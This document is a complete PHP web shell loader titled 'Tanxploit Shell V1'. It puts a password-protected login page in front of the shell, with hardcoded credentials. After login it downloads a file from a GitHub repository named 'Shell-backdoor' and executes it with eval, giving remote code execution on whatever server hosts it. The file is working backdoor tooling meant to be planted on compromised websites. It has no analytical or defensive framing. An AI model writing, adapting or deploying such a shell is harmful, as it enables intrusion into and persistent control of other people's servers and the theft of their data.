<?php
session_start();

// Encode username and password using MD5
$correct_username_md5 = md5('tanxploitv1');
$correct_password_md5 = md5('tan');

// Function to display login form
function display_login_form($error = '') {
  echo '<!DOCTYPE html>
        <html>
        <head>
          <title>Tanxploit Shell V1</title>
          <style>
            @import url("https://fonts.googleapis.com/css2?family=Roboto:wght@500&display=swap");

            body {
              font-family: Arial, sans-serif;
              background: linear-gradient(to right, #4e54c8, #8f94fb);
              display: flex;
              justify-content: center;
              align-items: center;
              height: 100vh;
              margin: 0;
              color: #fff;
            }
            .login-container {
              background-color: rgba(0, 0, 0, 0.7);
              padding: 60px;
              border-radius: 15px;
              box-shadow: 0 0 30px rgba(0, 0, 0, 0.5);
              text-align: center;
              width: 400px;
            }
            .login-container img {
              width: 250px;
              margin-bottom: 20px;
            }
            h2 {
              font-family: "Roboto", sans-serif;
              font-size: 28px;
              margin-bottom: 30px;
              margin-top: 10px;
            }
            input[type="text"], input[type="password"] {
              width: 100%;
              padding: 15px;
              margin: 15px 0;
              border: 1px solid #ccc;
              border-radius: 5px;
              box-sizing: border-box;
              font-size: 16px;
            }
            input[type="submit"] {
              background-color: #4CAF50;
              color: white;
              padding: 15px 20px;
              border: none;
              border-radius: 5px;
              cursor: pointer;
              width: 100%;
              font-size: 18px;
            }
            input[type="submit"]:hover {
              background-color: #45a049;
            }
            .error {
              color: red;
              margin-bottom: 20px;
              font-size: 16px;
            }
            .credit {
              margin-top: 30px;
              font-size: 16px;
              color: #bbb;
            }
          </style>
        </head>
        <body>
          <div class="login-container">
            <img src="https://i.ibb.co/kmn1FDW/20230310-235537.png" alt="Logo">
            <h2>Tanxploit Shell V1</h2>';
  if ($error) {
    echo "<p class='error'>$error</p>";
  }
  echo '  <form method="POST">
            <input type="text" name="username" placeholder="Enter Username" required>
            <input type="password" name="password" placeholder="Enter Password" required>
            <input type="submit" value="Login">
          </form>
          <div class="credit">Credit By Tanxploit404</div>
          </div>
        </body>
        </html>';
}

// Check if the user is already authenticated
if (!isset($_SESSION['authenticated'])) {
  if (isset($_POST['username']) && isset($_POST['password'])) {
    if (md5($_POST['username']) === $correct_username_md5 && md5($_POST['password']) === $correct_password_md5) {
      $_SESSION['authenticated'] = true;
      header("Location: " . $_SERVER['REQUEST_URI']);
      exit;
    } else {
      display_login_form("Incorrect username or password.");
      exit;
    }
  } else {
    display_login_form();
    exit;
  }
} else {
  // User is authenticated, fetch and execute the content of the target PHP file
  $target_url = "https://raw.githubusercontent.com/TanXploit/Shell-backdoor/main/alfareal.php";
  $content = file_get_contents($target_url);
  if ($content !== false) {
    eval("?>" . $content);
  } else {
    echo "Failed to retrieve the content.";
  }
}
?>
